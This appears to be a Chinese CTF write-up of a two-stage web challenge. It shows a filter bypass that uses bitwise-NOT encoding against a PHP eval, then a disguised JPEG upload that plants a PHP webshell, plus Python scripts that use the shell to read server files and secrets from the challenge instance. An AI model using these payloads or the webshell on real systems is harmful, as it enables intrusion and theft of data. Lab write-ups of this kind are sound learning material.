---
title: QCTFweek1老叟洗完头WP
date: 2026-10-08
category: CTF
tags:
  - CTF
  - Writeup
  - web
summary: 这道题分明是老叟戏顽童，你连一点拿flag的机会都没有
draft: true
---

# QCTFweek1老叟洗完头WP

> 这道题真的是太阴间了我打了整整三天才打出来。
> 你不炸，我不炸，鱼儿何时能长大。

## 第一节：背景 / 题目

这是一个网站（类似于博客），然后里面有登录界面，但是这里只能注册账号却不能登录账号，严格意义上说是可以登录账号的但是登录验证需要480秒且登录完完成之后什么事都没有发生，我一直以为这道题是考登录提权拿admin然后进/admin.php 或者可以进别的地方，但是最后都不行。

本来到这里就应该换方向了，但是我看到页面最下方有 repoter@thesun.com “聪明的我”想到注册账号的时候需要填写邮箱——这不就是admin的邮箱吗？！于是我就在尝试获取admin账号的路上走了两天。

我连真正意义上的登录都没有登上去，怎么可能拿到admin的session。

## 第二节：转机

真正意义上的转机在 /robots.txt 。
根据我之前信息搜集1的笔记，我其实早早发现了robots下面的内容：

`/robots.txt` 内容：

```text
User-agent: *
Disallow: /ad?min.php
Disallow: /backup/
Disallow: /upload/

多思考
```

（`/backup/` 和 `/upload/` 都是 403。）

那目标只能放在这个 /ad?min.php 上，我一直以为是把 ? 去掉，因为我之前进过 /admin.php 但是403 我知道有admin.php 这个路径啊但是没有打进去，然后一开始也忽略了这个ad?min

直到我把其它的路径都探完了（没错，我三天时间把除了ad?min以外的大多数路径都探了一遍），最后在ds的帮助之下，它告诉我：ad?min的?有没有可能是待补字符呢。

然后尝试填入 `1`，我打了三天之后终于入门了

```text
# 请求链路验证

审计以下服务端表达式处理逻辑，并读取目标文件。
```

```php
<?php
declare(strict_types=1);
# secret1是一个文件，你要想办法读取他

const PART1_FILE = 'secret1';

if (isset($_GET['v1'], $_GET['v2'], $_GET['v3'])) {
    $v1 = (string) $_GET['v1'];
    $v2 = (string) $_GET['v2'];
    $v3 = (string) $_GET['v3'];

    if (!is_numeric($v1) || !is_numeric($v2)) {
        die('number only');
    }
    if (preg_match('/[a-z0-9@!+\-._$}%&;<>\*\/^#"\'`\\\\]/i', $v3)) {
        die('get out hacker!');  # 不允许字母数字以及常用符号
    }

    $expr = $v1 . $v3 . $v2;
    $code = eval('return ' . $expr . ';');

    if (hash_equals(trim(file_get_contents(PART1_FILE)), (string) $code)) {
        echo '第一段密码：' . $code;
    }
}
```

这里就可以看到我们需要攻击的逻辑，v1、v2 都要求纯数字没办法改，我们要得到 secret1 有两个办法：

1. 硬爆破，如果题目想让我们这么做一般来说数字位都是小于等于四位的，但是显然爆破完之后没有结果。
2. 尝试运用 v3，跳出 v3 的字符限制，找到限制之外的字符构造出 `file_get_contents("secret1")`

**这里就要运用php的特性了——取反绕过**

1.php对于高位字节是允许存在的
`低位字节指的是ASCII 0-127 个字符，因为在二进制的表达里面它们的最高位都是0开头。`
`e.g. a = 0110 0001 `

2.php中`~`是对字符串里面的每一个字节取反字节：
e.g. 
```php
~(0000 0001) = 1111 1110 
```
而`~`并没有出现在限制中，这就意味着你可以构造高位字符然后用~来得到可打印字符

3.php7中可以直接调用函数而不需要先存进变量里面。

这下我们就可以直接跳过原来的限制，

生成它的 Python 片段：

```python
def nb(s): return bytes(b ^ 0xFF for b in s.encode("utf-8")) # 取反

v3 = b"?(~" + nb("file_get_contents") + b")((~" + nb("secret1") + b")):"
# 拼接payload
# v1=1&v2=0，v3 经 URL 编码后拼进查询串
```

最终 URL：

```text
/ad1min.php?v1=1&v2=0&v3=%3F%28~%99%96%93%9A%A0%98%9A%8B%A0%9C%90%91%8B%9A%91%8B%8C%29%28%28~%8C%9A%9C%8D%9A%8B%CE%29%29%3A
```

这下相当于直接执行了获取secret1的命令

随后我们就可以得到第一段的密码。

通过构造高位字符取反然后获得正确的命令执行。我们顺便翻到了同目录下的其他文件
`hint`、`ad1min_backend.php`、`ad1min_view.php`

**hint 文件**

```text
密钥就是secret1，异或加密会指引你前行
```

（伏笔：上传关的 XOR 密钥 = 第一段密码本身。）

**揭开面纱：真源码ad1min_backend.php**

同一个读文件原语把这份后端源码全文读了回来（多了 `deny()`、`ad1min_result()` 和stage1的置位逻辑）：

```php
<?php
declare(strict_types=1);
# secret1是一个文件，你要想办法读取他

const PART1_FILE = 'secret1';

function deny(string $msg = 'get out hacker!'): void
{
    $img = '/assets/img/waf-' . random_int(1, 3) . '.png';
    http_response_code(403);
    die('<!doctype html><meta charset="utf-8"><title>WAF</title><link rel="stylesheet" href="/assets/css/auth.css"><script src="/assets/js/site.js" defer></script><main class="auth-card taunt"><h1>' . htmlspecialchars($msg, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</h1><img src="' . $img . '" alt=""></main><footer class="site-footer"><span>thesun</span><p>repoter@thesun.com</p></footer>');
}

function ad1min_result(): array
{
    $view = [
        'expr' => '',
        'code' => '',
        'passed' => false,
    ];

    if (!isset($_GET['v1'], $_GET['v2'], $_GET['v3'])) {
        return $view;
    }

    $v1 = (string) $_GET['v1'];
    $v2 = (string) $_GET['v2'];
    $v3 = (string) $_GET['v3'];

    if (!is_numeric($v1) || !is_numeric($v2)) {
        deny('number only');
    }
    if (preg_match('/[a-z0-9@!+\-._$}%&;<>\*\/^#"\'`\\\\]/i', $v3)) {
        deny();
    }

    $view['expr'] = $v1 . $v3 . $v2;

    try {
        $code = eval('return ' . $view['expr'] . ';');
    } catch (Throwable $e) {
        deny();
    }

    $view['code'] = (string) $code;
    $view['passed'] = hash_equals(trim(file_get_contents(PART1_FILE)), $view['code']);

    if ($view['passed']) {
        $_SESSION['stage1'] = true;
        unset($_SESSION['stage1_waf']);
    }

    return $view;
}
```

## 第三节：pt.2

`ad1min_backend.php`（真源码）确认：成功即 `$_SESSION['stage1'] = true`，页面出现「进入图片审核后台」按钮。
第二段内容需要我们进入图片审核后台（我们惊讶地发现之前403的upload现在可进了）
因为打穿pt.1使得我们获得了PHPSESSID 让我们有权限能进/upload/了

我们看到这是一个上传jpg格式图片的页面，然后看到注释

```html
<!--
# include.php 虽然已经被废弃了，但没准有遗漏呢。
# PHP 那道题好像发生了一点变化。
-->
```

### /upload/include.php —— 废弃上传适配层（页面直给）

> 该文件已不再参与当前上传流程，仅保留一份旧版参数处理记录。

```php
<?php
# Deprecated upload include. Kept for compatibility review.

$origin = (string) ($_FILES['avatar']['name'] ?? '');
if (strtolower(pathinfo($origin, PATHINFO_EXTENSION)) !== 'jpg') {
    die('只允许 JPG 文件');
}

$decoded = upload_xor($encrypted, $key);
if (substr($decoded, 0, 2) !== "\xFF\xD8"
    || substr($decoded, -2) !== "\xFF\xD9") {
    die('JPG 文件头或文件尾无效');
}    # 只检查了头尾的格式

$gallery = preg_replace(
    '/[^a-zA-Z0-9_-]/',
    '',
    (string) ($_POST['gallery'] ?? 'default')
);
$gallery = $gallery === '' ? 'default' : $gallery;

$displayName = (string) ($_POST['display_name'] ?? $origin);
if (strlen($displayName) > 96 || stripos($displayName, '.jpg') === false) {
    die('展示文件名必须包含 .jpg');
}

$baseDirectory = UPLOAD_ROOT . '/' . $gallery;
$target = $baseDirectory . '/' . $displayName;
```

页脚还有一句谜语：

> ARCHIVED CODE / 兼容性记录：旧代码通常不会主动提醒后来者——哪些输入曾经由客户端补充，哪些名称最终参与了路径拼接。

**关键源码分析**

```php
$encrypted = file_get_contents($_FILES['avatar']['tmp_name']);
$key = trim(file_get_contents('.secret/part1.key'));      // = 第一段密码
$decoded = upload_xor($encrypted, $key);                  // 重复密钥 XOR
if (substr($decoded,0,2) !== "\xFF\xD8" || substr($decoded,-2) !== "\xFF\xD9") die;
$info = getimagesize($decodedPath);                       // 再验一次真图
$gallery = preg_replace('/[^a-zA-Z0-9_-]/','',$_POST['gallery'] ?? 'default');
$displayName = $_POST['display_name'] ?? $origin;
if (strlen($displayName) > 96 || stripos($displayName, '.jpg') === false) die;   // ★ 题眼：只查「包含 .jpg」，不查结尾
$target = UPLOAD_ROOT . "/$gallery/$displayName";         // realpath 防穿越
```

上方的源码分析我们就可以得到，我们要做的是上传一个

```text
("FFD8" + PHP源码 + "FFD9") XOR secret1密钥
```

的包含了.jpg的文件（注意不是后缀只是包含就行，后面也会说）


> 破解之法就在`display_name`只要有.jpg就过，完全不看它是不是最后一个后缀，而Apache却按最后一个扩展名执行，因此我们完全可以构建 `sh2.jpg.php` 过检查，一旦通过，就可以在后台当作php语言命令执行。

这就是**内容注入**，最后得到的`/upload/uploads/default/sh2.jpg.php`则是一个可执行的PHP

Webshell：

```php
<?php
if(isset($_GET["f"])){ $r=@file_get_contents($_GET["f"]); echo "[READ]".($r===false?"FAIL":$r); }
if(isset($_GET["l"])){ $r=@scandir($_GET["l"]); echo "[LS]".($r===false?"FAIL":implode("|",$r)); }
?>
```

这就是 FFD8 FFD9 中间的PHP源码。

### 读出第二关源码的脚本

这两个脚本操作的都不是网页本身而是背后的webshell，但是它认得`?l=`和`?f=`(我们自己的PHP里面写了)，但是最后依旧会在返回包里面返回查找的结果。
因此你可以理解成，这个网页是银行门口，这两个脚本的任务是去找到内应(就是我们之前早就埋好的PHP代码)，呼叫内应，然后完成之后再回到银行门口把财宝交给我们。

```python
# -*- coding: utf-8 -*-
"""
读出第二关（图片审核后台）的完整源码。
走已落盘的 webshell：
    ?l=目录   ->  列目录，输出以 [LS] 开头、用 | 分隔
    ?f=文件   ->  读文件，输出以 [READ] 开头（读不到则是 [READ]FAIL）
"""
import sys, socket, urllib.parse, re, time

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

HOST = "80-57efcd5c-c04b-481f-97b6-6678c97e1039.challenge.ctfplus.cn"   # 实例域名
SHELL = "/upload/uploads/default/sh2.jpg.php"   # 上传落盘的 webshell 路径

def req(path, timeout=15):
    """手搓最简 HTTP/1.1 GET（不依赖第三方库），返回原始响应字节"""
    sk = socket.create_connection((HOST, 80), timeout=timeout)
    sk.sendall((f"GET {path} HTTP/1.1\r\nHost: {HOST}\r\nUser-Agent: Mozilla/5.0\r\n"
                f"Connection: close\r\n\r\n").encode())
    d = b""
    sk.settimeout(timeout)
    try:
        while True:
            x = sk.recv(65536)
            if not x:
                break
            d += x
    except socket.timeout:
        pass
    sk.close()
    return d

def sh(**q):
    """调 webshell。查询值一定要 URL 编码（quote(safe='')），否则 / 和 : 会把请求搞坏"""
    qs = "&".join("%s=%s" % (k, urllib.parse.quote(v, safe="")) for k, v in q.items())
    d = req(SHELL + "?" + qs)
    t = d.split(b"\r\n\r\n", 1)[1].decode("utf-8", "replace") if b"\r\n\r\n" in d else ""
    # 坑：webshell 文件本体是张 JPEG，响应开头会混一段二进制噪音——靠 [READ]/[LS] 标记定位真输出
    i = t.find("[READ]")
    if i < 0:
        i = t.find("[LS]")
    return t[i:] if i >= 0 else t[-500:]

def ls(d):
    """列目录，返回目录项列表"""
    out = sh(l=d)
    m = re.search(r"\[LS\](.*)", out, re.S)
    names = []
    if m and "FAIL" not in m.group(1)[:8]:
        names = [x for x in m.group(1).strip().split("|") if x not in (".", "..")]
    print("### LS %s -> %s" % (d, names))
    return names

def read(f, limit=5000):
    """读文件并打印（这份源码约 7.2KB，想一次读全就把 limit 调大）"""
    out = sh(f=f)
    if "[READ]FAIL" in out[:40]:
        print("### READ %s -> FAIL\n" % f)
        return None
    body = out[len("[READ]"):]
    print("### READ %s (%d chars) ###\n%s\n" % (f, len(body), body[:limit]))
    return body

# 1) 列目录确认文件名
internal = ls("/srv/upload/_internal")
time.sleep(0.2)          # 每步之间停一下，轻手轻脚

# 2) 读第二关现行逻辑全文（就是下一小节那份 upload_backend.php）
read("/srv/upload/_internal/upload_backend.php")
time.sleep(0.2)

# 3) _internal 下其它源码/文本也顺手扫一遍
for n in internal:
    if n.endswith((".php", ".txt", ".md", ".json", ".inc")):
        read("/srv/upload/_internal/" + n)
        time.sleep(0.2)
```

### 第二关源码：拿到 shell 后读回的现行逻辑（/srv/upload/_internal/upload_backend.php 全文）

```php
<?php
declare(strict_types=1);

const UPLOAD_ROOT = __DIR__ . '/../uploads';
const UPLOAD_KEY_FILE = __DIR__ . '/../.secret/part1.key';

function upload_xor(string $data, string $key): string
{
    $result = '';
    $keyLength = strlen($key);
    if ($keyLength === 0) {
        return $result;
    }

    for ($i = 0, $length = strlen($data); $i < $length; $i++) {
        $result .= $data[$i] ^ $key[$i % $keyLength];
    }

    return $result;
}

function upload_jpeg_comments(string $path): array
{
    $raw = @file_get_contents($path);
    if ($raw === false || substr($raw, 0, 2) !== "\xFF\xD8") {
        return [];
    }

    $segments = [];
    $offset = 2;
    $length = strlen($raw);
    while ($offset + 4 <= $length) {
        if ($raw[$offset] !== "\xFF") {
            break;
        }
        while ($offset < $length && $raw[$offset] === "\xFF") {
            $offset++;
        }
        if ($offset >= $length) {
            break;
        }

        $marker = ord($raw[$offset++]);
        if ($marker === 0xDA || $marker === 0xD9) {
            break;
        }
        if ($marker >= 0xD0 && $marker <= 0xD7) {
            continue;
        }
        if ($offset + 2 > $length) {
            break;
        }

        $segmentLength = unpack('n', substr($raw, $offset, 2))[1] ?? 0;
        if ($segmentLength < 2 || $offset + $segmentLength > $length) {
            break;
        }
        if ($marker === 0xFE) {
            $segments[] = "\xFF\xFE" . substr($raw, $offset, $segmentLength);
        }
        $offset += $segmentLength;
    }

    return $segments;
}

function upload_restore_comments(string $path, array $segments): void
{
    if ($segments === []) {
        return;
    }

    $raw = @file_get_contents($path);
    if ($raw === false || substr($raw, 0, 2) !== "\xFF\xD8") {
        return;
    }

    $offset = 2;
    $length = strlen($raw);
    while ($offset + 4 <= $length) {
        if ($raw[$offset] !== "\xFF") {
            return;
        }
        while ($offset < $length && $raw[$offset] === "\xFF") {
            $offset++;
        }
        if ($offset >= $length) {
            return;
        }

        $markerPosition = $offset - 1;
        $marker = ord($raw[$offset++]);
        if ($marker === 0xDA) {
            $updated = substr($raw, 0, $markerPosition)
                . implode('', $segments)
                . substr($raw, $markerPosition);
            @file_put_contents($path, $updated);
            return;
        }
        if ($marker === 0xD9) {
            return;
        }
        if ($marker >= 0xD0 && $marker <= 0xD7) {
            continue;
        }
        if ($offset + 2 > $length) {
            return;
        }

        $segmentLength = unpack('n', substr($raw, $offset, 2))[1] ?? 0;
        if ($segmentLength < 2 || $offset + $segmentLength > $length) {
            return;
        }
        $offset += $segmentLength;
    }
}

function upload_is_inside_root(string $path): bool
{
    $root = realpath(UPLOAD_ROOT);
    $directory = realpath(dirname($path));
    if ($root === false || $directory === false) {
        return false;
    }

    return strpos($directory . DIRECTORY_SEPARATOR, $root . DIRECTORY_SEPARATOR) === 0;
}

function upload_save_image(string $source, string $target): string
{
    if (function_exists('imagecreatefromjpeg') && function_exists('imagejpeg')) {
        $image = @imagecreatefromjpeg($source);
        if ($image === false) {
            return '图片重绘失败';
        }

        $width = imagesx($image);
        $height = imagesy($image);
        $canvas = @imagecreatetruecolor($width, $height);
        if ($canvas === false) {
            imagedestroy($image);
            return '图片重绘失败';
        }
        imagecopyresampled($canvas, $image, 0, 0, 0, 0, $width, $height, $width, $height);
        $comments = upload_jpeg_comments($source);
        $saved = @imagejpeg($canvas, $target, 88);
        imagedestroy($canvas);
        imagedestroy($image);

        if (!$saved) {
            return '图片保存失败';
        }
        upload_restore_comments($target, $comments);
        return '图片重绘完成';
    }

    return @copy($source, $target) ? '图片保存完成' : '图片保存失败';
}

function upload_process(): array
{
    $result = ['message' => '', 'saved_url' => ''];
    if (!isset($_FILES['avatar']) || $_FILES['avatar']['error'] !== UPLOAD_ERR_OK) {
        $result['message'] = '上传失败';
        return $result;
    }

    $file = $_FILES['avatar'];
    $origin = (string) ($file['name'] ?? '');
    if (strtolower(pathinfo($origin, PATHINFO_EXTENSION)) !== 'jpg') {
        $result['message'] = '只允许 JPG 文件';
        return $result;
    }

    $encrypted = @file_get_contents((string) $file['tmp_name']);
    $key = trim((string) @file_get_contents(UPLOAD_KEY_FILE));
    if ($encrypted === false || $key === '') {
        $result['message'] = '上传失败';
        return $result;
    }

    $decodedPath = tempnam(sys_get_temp_dir(), 'decoded-');
    if ($decodedPath === false) {
        $result['message'] = '上传失败';
        return $result;
    }

    try {
        $decoded = upload_xor($encrypted, $key);
        if (strlen($decoded) < 4
            || substr($decoded, 0, 2) !== "\xFF\xD8"
            || substr($decoded, -2) !== "\xFF\xD9") {
            $result['message'] = 'JPG 文件头或文件尾无效';
            return $result;
        }

        if (@file_put_contents($decodedPath, $decoded) === false) {
            $result['message'] = '上传失败';
            return $result;
        }

        $info = @getimagesize($decodedPath);
        $mime = function_exists('mime_content_type')
            ? (string) (@mime_content_type($decodedPath) ?: '')
            : (is_array($info) ? (string) ($info['mime'] ?? '') : '');
        if ($info === false || !in_array($mime, ['image/jpeg', 'image/pjpeg'], true)) {
            $result['message'] = '只允许 JPG 文件';
            return $result;
        }

        $gallery = preg_replace('/[^a-zA-Z0-9_-]/', '', (string) ($_POST['gallery'] ?? 'default'));
        $gallery = $gallery === '' ? 'default' : $gallery;
        $displayName = (string) ($_POST['display_name'] ?? $origin);
        // ★ 只查「包含 .jpg」，不查结尾 —— 我们就可以构造 sh2.jpg.php 在这里
        if (strlen($displayName) > 96 || stripos($displayName, '.jpg') === false) {
            $result['message'] = '展示文件名必须包含 .jpg';
            return $result;
        }

        $baseDirectory = UPLOAD_ROOT . '/' . $gallery;
        if (!is_dir($baseDirectory) && !@mkdir($baseDirectory, 0775, true)) {
            $result['message'] = '保存目录创建失败';
            return $result;
        }

        $target = $baseDirectory . '/' . $displayName;
        if (!upload_is_inside_root($target)) {
            $result['message'] = '保存路径不合法';
            return $result;
        }

        $result['message'] = upload_save_image($decodedPath, $target);
        if ($result['message'] !== '图片保存完成' && $result['message'] !== '图片重绘完成') {
            return $result;
        }

        $_SESSION['stage2'] = true;
        $result['saved_url'] = '/upload/uploads/'
            . rawurlencode($gallery)
            . '/'
            . str_replace('%2F', '/', rawurlencode($displayName));
        return $result;
    } finally {
        @unlink($decodedPath);
    }
}
```

### 得到第二关密码的脚本


```python
# -*- coding: utf-8 -*-
"""
得到第二关的密码：读 /srv/upload/.secret/part2.php
和上一节的区别只有一个——这次目标是密码文件：
    part2 的内容形如 imag3-key_XXXX（每实例随机）
顺带读 part1.key 对照（它应当等于第一段密码 = XOR 密钥）。
同样走 webshell 的 ?l= 列目录 / ?f= 读文件。
"""
import sys, socket, urllib.parse, time

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

HOST = "80-57efcd5c-c04b-481f-97b6-6678c97e1039.challenge.ctfplus.cn"   # 实例域名
SHELL = "/upload/uploads/default/sh2.jpg.php"   # 上传落盘的 webshell 路径

def req(path, timeout=15):
    """手搓最简 HTTP/1.1 GET，返回原始响应字节"""
    sk = socket.create_connection((HOST, 80), timeout=timeout)
    sk.sendall((f"GET {path} HTTP/1.1\r\nHost: {HOST}\r\nUser-Agent: Mozilla/5.0\r\n"
                f"Connection: close\r\n\r\n").encode())
    d = b""
    sk.settimeout(timeout)
    try:
        while True:
            x = sk.recv(65536)
            if not x:
                break
            d += x
    except socket.timeout:
        pass
    sk.close()
    return d

def sh(**q):
    """调 webshell（查询值必须 URL 编码），返回 [READ]/[LS] 标记之后的内容"""
    qs = "&".join("%s=%s" % (k, urllib.parse.quote(v, safe="")) for k, v in q.items())
    d = req(SHELL + "?" + qs)
    t = d.split(b"\r\n\r\n", 1)[1].decode("utf-8", "replace") if b"\r\n\r\n" in d else ""
    i = t.find("[READ]")
    if i < 0:
        i = t.find("[LS]")
    return t[i:] if i >= 0 else t[-300:]

def read(f):
    """读文件并打印（密码文件都很短，不需要截断）"""
    body = sh(f=f)
    if body.startswith("[READ]FAIL"):
        print("############ %s -> FAIL ############\n" % f)
        return None
    body = body[len("[READ]"):] if body.startswith("[READ]") else body
    print("############ %s ############" % f)
    print(body[:2000])
    print()
    return body

# 1) 先列 .secret，确认里面有 part1.key / part2.php
print("secret 目录:", sh(l="/srv/upload/.secret")[:200])
time.sleep(0.2)

# 2) 读 part2.php = 第二段密码（这就是我们要的东西）
read("/srv/upload/.secret/part2.php")
time.sleep(0.2)

# 3) 对照读 part1.key（应等于第一段密码，验证 XOR 密钥一致）
read("/srv/upload/.secret/part1.key")
```

最后发送之后我们就可以得到返回包的body

**第二段**：

```text
GET /upload/uploads/default/sh2.jpg.php?f=/srv/upload/.secret/part2.php
→ imag3-key_93ae      （另一实例为 imag3-key_6ab9 —— 每实例随机）
```

## 第四节：结果

最后我们只需要把这两个交到最后的提交界面就可以拿到 flag。

`?ctf{02f1ac03-34c6-43ec-989f-7d027ad996f4}`

## 复盘 / 教训

主要是这次在找入口这里停留了太长的时间了，所以导致在我眼里这道题超级无敌难，实际上并不是，找到了robots.txt然后进了ad1min.php，接下来的路还是可以走的。
总而言之这道题还是十分有九分的有趣的(bushi)

<blockquote style="text-align:right">Cola_CaO From HZNU<br>2026.10.8</blockquote>
